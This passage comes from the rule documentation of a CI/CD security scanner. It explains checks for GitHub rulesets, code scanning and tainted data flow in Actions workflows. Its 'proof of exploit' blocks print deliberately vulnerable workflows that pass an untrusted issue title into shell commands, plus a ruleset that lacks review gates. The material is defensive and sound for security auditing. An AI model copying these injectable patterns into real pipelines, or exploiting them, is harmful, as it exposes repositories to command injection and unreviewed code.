**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure there are restrictions on who can dismiss code change reviews.

**How this is detected.** Reads ``allow_auto_merge`` from the repo metadata (already fetched by every SCM scan; no extra endpoint). Fires when the value is ``true``. A missing field is treated as the GitHub default (``false``) and passes. The check is intentionally orthogonal to whether reviews are required — auto-merge with strong required-review controls is sometimes acceptable, auto-merge with weak ones is not. SCM-031 surfaces the trade-off; the operator pairs the finding with the SCM-002 / SCM-011 / SCM-014 / SCM-021 status to decide whether to keep auto-merge.

**Recommendation.** In repo Settings → General → Pull Requests, uncheck ``Allow auto-merge``. With auto-merge on, the PR merges the moment its required checks pass — including any required reviews already on the PR — with no further human gate on *when* the merge happens. The risk is compositional: combined with SCM-021 (Actions can self-approve PRs) or SCM-018 (PR-review bypass allowance), a workflow that opens a PR, satisfies its own required-review gate, and waits for status checks lands code into main without a human ever looking at the diff at the merge moment. If the workflow itself is what was compromised (Shai-Hulud, postinstall worm), the auto-merge step is the last gate that didn't fire.

If your team relies on auto-merge for throughput, the compensating controls are SCM-021 (Actions cannot self-approve), SCM-002 (required reviews ≥ 1), SCM-011 (CODEOWNERS reviews required), and SCM-014 (last-push approval) — all together. Without all four, auto-merge is the path of least resistance for an unauthored commit to reach main.

**Known false positives.**

- High-throughput engineering orgs that pair auto-merge with rigorous required-reviews + CODEOWNERS + last-push approval + no-Actions-self-approval (SCM-021) legitimately depend on auto-merge for velocity. The right pattern is to suppress this rule with a rationale that names the compensating controls so the trade-off stays visible at every audit. Suppressing without naming the controls makes the trade-off invisible to the next reviewer.

**Source:** [`SCM-031`](../providers/scm.md#scm-031) in the [SCM provider](../providers/scm.md).

### `SCM-032`: Active ruleset doesn't require a PR review (governance theater) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-032 }

**Evidences:** [`1.1.3`](#ctrl-1-1-3) Ensure any change to code is approved by two strongly authenticated users.

**How this is detected.** For every active ruleset (``enforcement: "active"``) with an evaluable detail body, walks the ``rules`` array looking for an entry with ``type: "pull_request"`` whose ``parameters.required_approving_review_count`` is at least 1. Fires when none is found. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced with an evaluation-gap note (the same pattern SCM-030 uses).

Pairs with SCM-002 (legacy branch-protection required reviews) and SCM-029 (ruleset not enforced). The three rules together cover the required-review surface: SCM-002 for legacy BP, SCM-029 for the existence of an active ruleset, SCM-032 for whether that ruleset actually requires a PR.

**Recommendation.** Add a ``pull_request`` rule to every active ruleset and set ``parameters.required_approving_review_count`` to at least 1 (Settings → Rules → <ruleset> → Add rule → Require a pull request before merging → Required approvals). An active ruleset without a PR-review gate is the same shape as legacy branch protection without required reviews (SCM-002): the ruleset is enforced — force-push denial, signed commits, status checks may all fire — but pushes / merges still go through without human review. Operators commonly create rulesets for specific governance signals (e.g., commit-message patterns for compliance) and forget that the PR-review gate is a separate rule type that has to be added explicitly.

SCM-032 evaluates rulesets in isolation: it does not consult legacy branch-protection state, so it fires on any active ruleset that lacks a PR-review rule, even when legacy branch protection on the same ref provides the required-review gate. SCM-002 covers the legacy branch-protection side; the two rules together describe the full review-control surface.

**Known false positives.**

- Some rulesets are deliberately scoped to enforce only non-PR-review controls (e.g., a ``commit_message_pattern`` ruleset for changelog compliance, or a ``tag_name_pattern`` ruleset for release tagging). The right pattern is to ALSO have a separate ruleset that enforces PR reviews on the same refs; SCM-032 fires when the *combination* leaves a gap. Suppress on the specific ruleset id with a rationale that names the PR-review channel (separate ruleset or legacy branch protection).

**Proof of exploit.**

```
# Vulnerable: the ruleset is enforced (governance theater
# checks pass) but doesn't include a ``pull_request``
# rule. Pushes to ``main`` still require a PR (via
# ``deletion`` / ``non_fast_forward`` rules), but the PR
# itself doesn't need any review. A single author
# self-merges into production.
# GET /repos/myorg/myrepo/rulesets/123:
{
  "name": "main-protection",
  "enforcement": "active",
  "rules": [
    {"type": "deletion"},
    {"type": "non_fast_forward"}
  ]
}

# Safe: add a ``pull_request`` rule with at least one
# required reviewer. Pair with ``dismiss_stale_reviews_
# on_push: true`` so a re-push invalidates the approval
# and forces a fresh review.
# PUT /repos/myorg/myrepo/rulesets/123:
{
  "name": "main-protection",
  "enforcement": "active",
  "rules": [
    {"type": "deletion"},
    {"type": "non_fast_forward"},
    {"type": "pull_request",
     "parameters": {
       "required_approving_review_count": 1,
       "dismiss_stale_reviews_on_push": true
     }}
  ]
}
```

**Source:** [`SCM-032`](../providers/scm.md#scm-032) in the [SCM provider](../providers/scm.md).

### `SCM-033`: Active ruleset doesn't require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-033 }

**Evidences:** [`1.1.9`](#ctrl-1-1-9) Ensure all checks have passed before merging new code.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_status_checks"`` whose ``parameters.required_status_checks`` lists at least one context. Empty lists are treated as no rule. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced explicitly. Passes silently when no rulesets are configured (legacy branch-protection SCM-008 covers the gap).

**Recommendation.** Add a ``required_status_checks`` rule to every active ruleset and populate ``parameters.required_status_checks`` with the names of the contexts that must pass (Settings → Rules → <ruleset> → Add rule → Require status checks to pass before merging → pick the specific check runs). Without it, the ruleset is enforced but pushes / merges land without any of your tests, lint, security scans, or build verification actually being green — the ruleset documents that checks *exist* without requiring them to *pass*. The ruleset analog of SCM-008 (legacy branch-protection required checks).

An empty contexts list (``required_status_checks: []``) is the same as no rule — it documents the gate without filling it. Pick at least one canonical job name (the primary build) and add the rest of your CI matrix over time.

**Known false positives.**

- Some rulesets are deliberately scoped to non-CI concerns (commit-message format, tag-name pattern); those should be paired with a separate ruleset that enforces status checks on the same refs. Suppress with a rationale that names the parallel ruleset.

**Source:** [`SCM-033`](../providers/scm.md#scm-033) in the [SCM provider](../providers/scm.md).

### `SCM-034`: Active ruleset doesn't block force-push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-034 }

**Evidences:** [`1.1.16`](#ctrl-1-1-16) Ensure force push is denied.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "non_fast_forward"``. Presence of the rule means force-pushes are blocked on the refs the ruleset targets. Passes silently when no rulesets are configured (legacy SCM-007 covers the gap).

**Recommendation.** Add a ``non_fast_forward`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Block force pushes). Without it, a force-push rewrites history on the target branch — commits that previously appeared in the audit trail disappear from the surface log, and anyone with push access can erase evidence of an earlier action. The ruleset analog of SCM-007 (legacy branch-protection force-push denial). Pair with SCM-006 (signed commits) so even a rewrite leaves verifiable signatures on the surviving commits.

**Known false positives.**

- Release-engineering rulesets sometimes deliberately allow force-push on a specific tag-pattern target (e.g. moving release tags). Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-034`](../providers/scm.md#scm-034) in the [SCM provider](../providers/scm.md).

### `SCM-035`: Active ruleset doesn't block branch deletion <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-035 }

**Evidences:** [`1.1.17`](#ctrl-1-1-17) Ensure branch deletion is denied.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "deletion"``. Presence of the rule means deletion is blocked. Passes silently when no rulesets are configured (legacy SCM-009 covers the gap).

**Recommendation.** Add a ``deletion`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Restrict deletions). Without it, anyone with push access to a ref the ruleset targets can delete that ref. The ruleset analog of SCM-009 (legacy branch-protection branch deletion denial). Mostly a hygiene control — deleted commits are recoverable from the reflog until garbage collection — but loss of the default-branch ref is a real operational disruption.

**Known false positives.**

- Rulesets that target ephemeral preview / feature branches legitimately allow deletion. Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-035`](../providers/scm.md#scm-035) in the [SCM provider](../providers/scm.md).

### `SCM-036`: Active ruleset doesn't require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-036 }

**Evidences:** [`1.1.12`](#ctrl-1-1-12) Ensure verification of signed commits for new changes.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_signatures"``. Presence means commits to the targeted refs must carry a valid signature. Passes silently when no rulesets are configured (legacy SCM-006 covers the gap).

**Recommendation.** Add a ``required_signatures`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require signed commits). Without it, a compromised contributor account (or a stolen PAT) can push commits that appear to originate from any author the attacker names in the commit metadata. The signature requirement ties each commit to a key the contributor controls (SSH / GPG / sigstore via gitsign), so post-incident the audit log shows which commits were signed by the key vs forged. The ruleset analog of SCM-006 (legacy branch-protection signed-commit enforcement).

**Known false positives.**

- Teams that haven't yet rolled out signing keys for all contributors sometimes ship without signature enforcement to avoid blocking ordinary PRs. The right pattern is a phased rollout (configure the rule in ``evaluate`` mode first, then flip to ``active`` once contributors have their keys). Suppress with a rationale that names the rollout date.

**Source:** [`SCM-036`](../providers/scm.md#scm-036) in the [SCM provider](../providers/scm.md).

### `SCM-037`: Active ruleset's pull_request rule doesn't dismiss stale reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-037 }

**Evidences:** [`1.1.4`](#ctrl-1-1-4) Ensure previous approvals are dismissed when updates are introduced.

**How this is detected.** For every active ruleset with a ``pull_request`` rule, checks ``parameters.dismiss_stale_reviews_on_push`` is ``true``. Skips rulesets that don't have a ``pull_request`` rule at all — SCM-032 owns that surface. Passes silently when no rulesets are configured (legacy SCM-012 covers the gap).

**Recommendation.** On every active ruleset's ``pull_request`` rule, set ``parameters.dismiss_stale_reviews_on_push: true`` (Settings → Rules → <ruleset> → Require a pull request before merging → Dismiss stale pull request approvals when new commits are pushed). Without it, an attacker can land an approving review on a benign early version of the PR, then force-push (if not blocked by SCM-034) or otherwise update the head with malicious commits, and the original approval still counts toward the required-review gate.

The ruleset analog of SCM-012 (legacy branch-protection stale-review dismissal). Pair with SCM-032 (PR-review presence) — without dismissal, the review-count gate documents intent rather than reality once the PR has diverged from the approved state.

**Known false positives.**

- Some workflows use ephemeral review-bot accounts that auto-re-approve after push; dismissing on push then re-issuing the approval is the documented pattern. The rule still fires (the dismissal happens) and the re-approval lands separately. If your team operates a different review-velocity flow, suppress with a rationale that names the re-approval channel.

**Source:** [`SCM-037`](../providers/scm.md#scm-037) in the [SCM provider](../providers/scm.md).

### `SCM-038`: Active ruleset doesn't require linear history <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-038 }

**Evidences:** [`1.1.13`](#ctrl-1-1-13) Ensure linear history is required.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_linear_history"``. Presence means merge commits to the targeted refs are rejected (only fast-forward / rebase / squash integration is allowed). Passes silently when no rulesets are configured — linear history has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``required_linear_history`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require linear history). Without it, merges into the targeted refs can introduce merge commits, which produce a branching history where two ancestors share authorship of the merge result. Linear history forces rebase- or squash-style integration so every commit on the trunk has a single parent and a single attributable author. This pairs with SCM-036 (signed commits) to give post-incident forensics a clean answer to *who wrote this code and when*: each commit on main has one signature, one author, one parent, one timestamp.

Merge commits aren't a direct attacker primitive — force-push (SCM-034) is the history-rewrite surface — but they obscure git-bisect and complicate ``git log --first-parent`` triage during an incident, and they hide which specific commits landed when a long-lived feature branch is merged.

**Known false positives.**

- Teams that prefer merge commits as a deliberate policy (e.g. to preserve the shape of long-lived feature branches in the history) legitimately ship without this rule. Suppress with a rationale that names the merge-strategy policy. The rule is a hygiene / auditability control, not a hard security gate.

**Source:** [`SCM-038`](../providers/scm.md#scm-038) in the [SCM provider](../providers/scm.md).

### `SCM-039`: Active ruleset doesn't pin a required workflow <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-039 }

**Evidences:** [`1.1.9`](#ctrl-1-1-9) Ensure all checks have passed before merging new code, [`1.1.18`](#ctrl-1-1-18) Ensure any merging of code is automatically scanned for security.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "workflows"`` whose ``parameters.workflows`` is a non-empty list. An empty workflows list is treated as no rule (it documents the gate without filling it). Passes silently when no rulesets are configured — required workflows have no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``workflows`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require workflows to pass before merging) and pin at least one workflow by repository + path + ref. The ``workflows`` ruleset rule differs from ``required_status_checks`` (SCM-033) in a load-bearing way: status checks gate on a context *name* that the workflow chooses to report — if the PR edits the workflow YAML to remove or rename that context, the check vanishes and the gate documents intent rather than reality. The ``workflows`` rule pins the workflow file at a vetted ref (``main`` or a specific SHA) and forces *that* workflow to run against the PR's code regardless of what the PR did to the workflow YAML in its own branch. Closes the scan-removal supply-chain shape (attacker opens a PR that deletes ``.github/workflows/security-scan.yml`` and submits malicious code in the same PR).

Pin the workflow ref to either a long-lived branch the ruleset bypass actors don't have write access to or a specific SHA. A ref pinned to a branch the PR author controls undoes the protection.

**Known false positives.**

- Repos that don't run any workflow-based gating at all (pure code-review + signed-commits posture) legitimately ship without this rule. Suppress with a rationale that names the compensating controls. The rule fires LOW because most teams' security posture comes from status-checks (SCM-033); the workflows rule is the stricter scan-removal-resistant variant.

**Source:** [`SCM-039`](../providers/scm.md#scm-039) in the [SCM provider](../providers/scm.md).

### `SCM-040`: Active ruleset doesn't gate on code scanning results <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-040 }

**Evidences:** [`1.1.18`](#ctrl-1-1-18) Ensure any merging of code is automatically scanned for security.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "code_scanning"`` whose ``parameters.code_scanning_tools`` lists at least one tool. An empty tools list documents the gate without filling it and is treated as no rule. Passes silently when no rulesets are configured — the rule_type is ruleset-only and has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``code_scanning`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require code scanning results) and pin at least one tool (CodeQL, the most common choice) with a non-empty alerts threshold. The rule turns a passive code-scanning configuration (SCM-003 — default setup is on) into an active merge gate: the PR can't merge until the scan completes for the head SHA *and* the configured threshold isn't crossed (e.g. ``security_alerts_threshold: "high_or_higher"`` rejects merges that introduce high-severity findings). Closes the asymmetry between code scanning being enabled and the org actually blocking on its results.

If your org doesn't license GHAS (the underlying feature), this rule type isn't available. Suppress with a rationale that names the licensing constraint and carry the gate via ``required_status_checks`` (SCM-033) pointed at the named context the scan tool reports.

**Known false positives.**

- GHAS-licensing constraint: the ``code_scanning`` ruleset rule type requires GitHub Advanced Security on the repo. Repos on free / team tier can't configure this rule even when they run code scanning via third-party tools. Suppress with the licensing rationale and ensure SCM-033 carries the merge gate via the scan tool's reported status-check context.

**Source:** [`SCM-040`](../providers/scm.md#scm-040) in the [SCM provider](../providers/scm.md).

### `SCM-041`: Active ruleset doesn't gate on a deployment environment <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-041 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_deployments"`` whose ``parameters.required_deployment_environments`` lists at least one environment. Empty lists are treated as no rule. Passes silently when no rulesets are configured — required-deployments enforcement has no legacy branch-protection analog in this scanner's coverage and is not separately evaluated.

**Recommendation.** Add a ``required_deployments`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require deployments to succeed before merging) and pin at least one environment (typically the staging environment that a CI pipeline deploys the PR's commit to). Pairs with SCM-023 (env reviewers) and SCM-024 (env branch policy): SCM-023/024 ensure the environment itself is gated; SCM-041 makes a successful deployment to that environment a merge prerequisite. Without it, a PR can merge into the default branch without a smoke-test deployment having run, even when the environment is rigorously configured. The ruleset analog of legacy branch protection's ``required_deployments`` checkbox.

An empty environments list (``required_deployment_environments: []``) documents the gate without filling it and is treated as no rule. Pick at least one environment name (typically ``staging`` or ``preview``) so the rule actually gates.

**Known false positives.**

- Repos that don't have GitHub deployment environments configured (or that gate via status-checks SCM-033 pointed at a deploy job's reported context) legitimately ship without this rule. Suppress with a rationale that names the compensating control. The rule fires LOW because most teams' deployment gating comes from the environment configuration itself (SCM-023, SCM-024); SCM-041 is the merge-side complement that closes the gap when an environment exists but isn't named in any ruleset.

**Source:** [`SCM-041`](../providers/scm.md#scm-041) in the [SCM provider](../providers/scm.md).

### `SCM-042`: Active ruleset doesn't require merge queue <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-042 }

**Evidences:** [`1.1.10`](#ctrl-1-1-10) Ensure open Git branches are up to date before they can be merged.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "merge_queue"``. Presence means merges to the targeted refs must enter the queue. Passes silently when no rulesets are configured — merge queue has no legacy branch-protection analog (the feature is ruleset-only).

**Recommendation.** Add a ``merge_queue`` rule to every active ruleset that covers a high-throughput trunk (Settings → Rules → <ruleset> → Add rule → Require merge queue). Without it, two PRs that each pass ``required_status_checks`` (SCM-033) independently can both merge into the same trunk and produce a state where the combined diff wasn't actually validated — a class of integration regressions that CI on the individual PRs can't catch. The merge queue serializes merges and re-runs the configured checks against the queue's post-merge candidate commit before the merge lands, so the trunk always reflects a tested state.

Pair with SCM-033 (required status checks). SCM-033 ensures CI passes BEFORE merge; SCM-042's merge queue ensures CI passes AFTER merge in queue order. The two gates address different failure modes — the queue closes the merge-race surface that per-PR CI can't see.

**Known false positives.**

- Low-throughput repos (one or two PRs landing per day) don't typically hit the merge-race shape this rule addresses; the operational cost of a merge queue can outweigh the benefit. Suppress with a rationale that names the merge-velocity profile. The rule fires LOW because most teams' CI integrity comes from status-checks (SCM-033); merge_queue is the additional concurrency-hardening control.

**Source:** [`SCM-042`](../providers/scm.md#scm-042) in the [SCM provider](../providers/scm.md).

### `SCM-043`: Tag-targeted ruleset doesn't require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-043 }

**Evidences:** [`1.1.12`](#ctrl-1-1-12) Ensure verification of signed commits for new changes, [`1.1.17`](#ctrl-1-1-17) Ensure branch deletion is denied.

**How this is detected.** Iterates active rulesets where ``target == "tag"`` and fires when none enforce ``required_signatures`` on the tag refs they cover. Passes silently when no tag-targeted rulesets exist at all (a separate gap: there's no tag protection to evaluate).

**Recommendation.** Add a ``required_signatures`` rule to every active ruleset whose ``target == tag`` (Settings → Rules → <ruleset> → Add rule → Require signed commits). Tag objects under a release-like glob (``refs/tags/v*`` or ``refs/tags/**``) are downstream consumers' lookup keys; an unsigned tag means a stolen PAT can stamp a release with arbitrary author metadata while the branch-side signing requirement (SCM-006 / SCM-036) passes.

**Known false positives.**

- Repos that sign tags via a release workflow rather than the ruleset gate (e.g. ``cosign sign`` on the release artifact) get equivalent provenance. Suppress per repo with a rationale that names the workflow.

**Source:** [`SCM-043`](../providers/scm.md#scm-043) in the [SCM provider](../providers/scm.md).

### `SCM-044`: Default-branch signed-commits requirement bypassed for admins <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-044 }

**Evidences:** [`1.1.12`](#ctrl-1-1-12) Ensure verification of signed commits for new changes, [`1.1.14`](#ctrl-1-1-14) Ensure branch protection rules are enforced for administrators.

**How this is detected.** Fires when ``required_signatures.enabled == True`` and ``enforce_admins.enabled`` is missing or ``False``. The rule passes silently in two cases: when signed commits aren't required at all (SCM-006 owns that surface) and when branch protection is missing entirely (SCM-001).

**Recommendation.** Enable ``Include administrators`` (``enforce_admins``) on the default-branch protection rule so the signed-commit requirement applies to admins too. Alternatively, migrate the requirement into a repository ruleset where bypass actors are explicit and auditable — admin bypass via the legacy protection knob is implicit, while a ruleset bypass list names each actor and is visible in the audit log (see SCM-030 for the ruleset-side bypass check).

**Known false positives.**

- Solo-maintainer repos where the single admin is also the only signing-key holder may turn off enforce_admins to self-recover from a lost key. Suppress per repo with a rationale that names the recovery workflow.

**Source:** [`SCM-044`](../providers/scm.md#scm-044) in the [SCM provider](../providers/scm.md).

### `SCM-045`: Default code scanning uses the limited query suite <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-045 }

**Evidences:** [`1.1.18`](#ctrl-1-1-18) Ensure any merging of code is automatically scanned for security, [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** Reads ``query_suite`` from the default code-scanning setup endpoint. Fires only when ``state == configured`` AND ``query_suite == default``. Passes silently when scanning is off (SCM-003 owns that case) or when the suite is already ``extended``.

**Recommendation.** In ``Settings → Code security → Code scanning → Default setup``, switch ``Query suite`` from ``Default`` to ``Extended``. The extended suite adds CodeQL's ``security-and-quality`` pack, which catches maintainability and reliability issues that often co-occur with security findings (e.g. dead-code paths that hide an unauthenticated branch). Teams that ship a hand-authored CodeQL workflow can pin ``queries: security-extended`` in ``.github/codeql/codeql-config.yml`` for the same effect.

**Known false positives.**

- Teams that route code-scanning via a hand-authored CodeQL workflow rather than default setup will see SCM-045 pass by virtue of ``state != configured``; verify the workflow pins the extended suite. Some repos intentionally keep the default suite to bound CI minutes; suppress per repo with a rationale.

**Source:** [`SCM-045`](../providers/scm.md#scm-045) in the [SCM provider](../providers/scm.md).

### `SCM-046`: Default code scanning is configured but paused <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-046 }

**Evidences:** [`1.1.18`](#ctrl-1-1-18) Ensure any merging of code is automatically scanned for security, [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** Reads ``schedule`` from the default code-scanning setup endpoint. Fires when ``state == configured`` AND schedule is ``None`` / ``"none"`` / missing. Passes silently when scanning is off entirely (SCM-003) or when a schedule is set.

**Recommendation.** Set ``schedule`` to ``weekly`` (or ``daily`` if CI minutes allow) on the default code-scanning setup, and confirm ``On push`` + ``On pull request`` triggers are enabled in ``Settings → Code security → Code scanning → Default setup → Edit configuration``. Without a schedule or event trigger, the setup record exists but no scan output ever lands; the Code Scanning UI stays empty and SCM-003 passes because ``state == configured``.

**Known false positives.**

- Repos that route scanning via a hand-authored workflow may keep default setup configured but unscheduled intentionally. Suppress per repo with a rationale that names the workflow file.

**Source:** [`SCM-046`](../providers/scm.md#scm-046) in the [SCM provider](../providers/scm.md).

### `SCM-047`: Repo language excluded from default code-scanning coverage <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-047 }

**Evidences:** [`1.1.18`](#ctrl-1-1-18) Ensure any merging of code is automatically scanned for security, [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** Cross-references the linguist ``languages`` endpoint against the default-setup ``languages`` slot. Fires when a CodeQL-supported language present at ≥5% of repo bytes is missing from the scanning set. Passes silently when default scanning isn't configured (SCM-003 / SCM-046 own those cases) or when the languages endpoint is unavailable.

**Recommendation.** Open the default code-scanning setup configuration (``Settings → Code security → Code scanning → Default setup → Edit configuration``) and add the missing languages to the analyzed set. If a language isn't CodeQL-supported (e.g. Shell, Lua), set up a third-party SAST workflow that uploads SARIF for that subset — default setup's auto-detect doesn't cover every language.

**Known false positives.**

- Monorepos may intentionally exclude legacy subdirectories from CodeQL analysis (e.g. a vendored fork). Suppress per repo with a rationale that names the excluded path; the default-setup language toggle is repo-wide, so a per-path exclusion requires a hand-authored workflow.

**Source:** [`SCM-047`](../providers/scm.md#scm-047) in the [SCM provider](../providers/scm.md).

### `TAINT-001`: Untrusted input flows across step boundaries via step outputs <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-001 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** GHA-003 detects the *direct* interpolation case (``${{ github.event.* }}`` inside a ``run:`` body) and the *single-step* env-inheritance case. TAINT-001 fills the cross-step gap: a producer step sets a tainted step output, and a consumer step (in the same job) interpolates it via ``${{ steps.<id>.outputs.<name> }}``. The producer's interpolation is GHA-003's finding; TAINT-001's finding lives at the consumer (the actual injection sink) and carries the full chain in its description so a reader sees both sides at once.

v1 limitations: only same-job step outputs are tracked; ``jobs.<id>.outputs.*`` (cross-job propagation) and reusable-workflow input/output forwarding are tracked as future work in ``ROADMAP.md``. The producer pass matches the canonical ``echo "name=..." >> $GITHUB_OUTPUT`` shape and the legacy ``::set-output name=...::`` workflow-command form.

**Recommendation.** Sanitise the value at the step that *writes* the ``$GITHUB_OUTPUT`` entry. The canonical pattern is to interpolate the untrusted source into an ``env:`` variable on the producer step and reference the env var in the ``echo``: ``env: TITLE: ${{ github.event.issue.title }}`` then ``echo "title=$TITLE" >> $GITHUB_OUTPUT``. After that, downstream steps reading ``steps.<id>.outputs.title`` see a string-typed value with no GitHub-expression evaluation pass left to exploit. Removing the source entirely is the safest fix; if the value genuinely needs to flow downstream, round-trip it through an env var the way GHA-003 recommends so the shell quoting still applies.

**Known false positives.**

- If the producer step deliberately runs a sanitiser between the interpolation and the ``$GITHUB_OUTPUT`` write (``echo "$TITLE" | tr -dc 'a-zA-Z0-9 ' >> $GITHUB_OUTPUT``), the consumer is no longer exploitable. The rule's regex doesn't model that transformation and will still fire; suppress via ignore-file scoped to the consumer step name when this is the deliberate shape. The producer's GHA-003 finding then carries the residual signal that the sanitiser is load-bearing.

**Proof of exploit.**

```
# Vulnerable: a producer step writes
# ``$GITHUB_OUTPUT`` from an untrusted source
# (``github.event.issue.title`` / ``github.head_ref``);
# a later step interpolates the step output into a
# shell command. The interpolation lets injected
# metacharacters in the title execute as separate shell
# commands in the consumer step.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - id: extract
        run: |
          echo "title=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"
      - run: ./generate-notes --title ${{ steps.extract.outputs.title }}

# Safe: sanitise the untrusted value at the producer
# step BEFORE it lands in $GITHUB_OUTPUT. The canonical
# pattern is to pull the source into an env var, strip
# unsafe chars with a known-good filter, and only then
# write the sanitised value. The consumer step uses an
# env-var indirection with shell quoting.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - id: extract
        env:
          RAW_TITLE: ${{ github.event.issue.title }}
        run: |
          clean=$(echo "$RAW_TITLE" | tr -dc 'a-zA-Z0-9 -')
          echo "title=$clean" >> "$GITHUB_OUTPUT"
      - env:
          TITLE: ${{ steps.extract.outputs.title }}
        run: ./generate-notes --title "$TITLE"
```

**Source:** [`TAINT-001`](../providers/github.md#taint-001) in the [GitHub Actions provider](../providers/github.md).

### `TAINT-002`: Untrusted input flows across jobs via ``jobs.<id>.outputs:`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-002 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** TAINT-001 catches step-output flow within a single job; TAINT-002 catches the cross-job transition. Engine shape: walk every job's ``outputs:`` mapping looking for values that interpolate either a tainted step output or a direct ``${{ github.event.* }}`` source. Tainted job outputs are matched against every ``${{ needs.<job>.outputs.<name> }}`` reference in any downstream job's ``run:`` / ``with:`` body. Each match emits a TAINT-002 finding with the full chain in the description.

Two propagation hops the engine tracks beyond the obvious ``${{ ... }}`` interpolation:

1. **Step env-var binding.** A producer step with ``env: { LABELS: "${{ toJSON(github.event.pull_request.labels.*.name) }}" }`` and a run body that writes ``echo "targets=$LABELS" >> $GITHUB_OUTPUT`` propagates taint from the env binding into the output, even though the run body's RHS doesn't contain a literal ``${{ ... }}`` token. Catches the indirect-env shape GHA-003 deliberately treats as safe (quoted shell) but that still flows into downstream sinks.
2. **Matrix expansion via ``fromJSON``.** ``strategy.matrix.<axis>: ${{ fromJSON(needs.<job>.outputs.<name>) }}`` paired with ``${{ matrix.<axis> }}`` in a downstream ``run:`` body. Every matrix value the expansion produces lands in the consumer's shell template. This is the GitHub Security Lab matrix-expansion-injection writeup shape that closed several public bug bounties.

Same-step interpolations (the producer's own use of ``${{ github.event.* }}`` inside its ``run:``) are still GHA-003's responsibility; TAINT-002's value is the cross-job hop the single-step rule can't see.

**Recommendation.** Sanitise the value at the producer step *before* it lands in ``$GITHUB_OUTPUT``. Once the value is in a job output the consuming job has no expression-level escaping pass left, ``${{ needs.<job>.outputs.<name> }}`` substitutes the string verbatim into the consumer's shell. The canonical safe pattern is to copy the untrusted source into the producer step's ``env:`` block, reference the env var quoted in ``echo "name=$VAR" >> $GITHUB_OUTPUT``, and only then surface it through the job output. The consuming job should still treat the value as tainted (use it in env-var form, not interpolated directly into shell).

**Known false positives.**

- Sanitisation between the source interpolation and the $GITHUB_OUTPUT write isn't modeled. If the producer step runs ``echo "$TITLE" | tr -dc 'a-zA-Z0-9 '`` before redirecting to GITHUB_OUTPUT, the consumer is no longer exploitable but TAINT-002 will still fire; suppress via ignore-file scoped to the consumer job's workflow file when this is the deliberate shape.

**Proof of exploit.**

```
# Vulnerable: an ``extract`` job exposes an untrusted
# value via ``jobs.extract.outputs:`` and a downstream
# job consumes it via ``needs.extract.outputs.title``
# directly in a shell command. The cross-job hop is
# usually invisible during PR review because the
# producer and consumer live in different YAML blocks.
jobs:
  extract:
    runs-on: ubuntu-latest
    outputs:
      title: ${{ steps.x.outputs.title }}
    steps:
      - id: x
        run: echo "title=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"
  use:
    needs: extract
    runs-on: ubuntu-latest
    steps:
      - run: ./generate-notes --title ${{ needs.extract.outputs.title }}

# Safe: sanitise at the producer + quote at the consumer
# via env-var indirection, same shape as TAINT-001 but
# across the jobs boundary.
jobs:
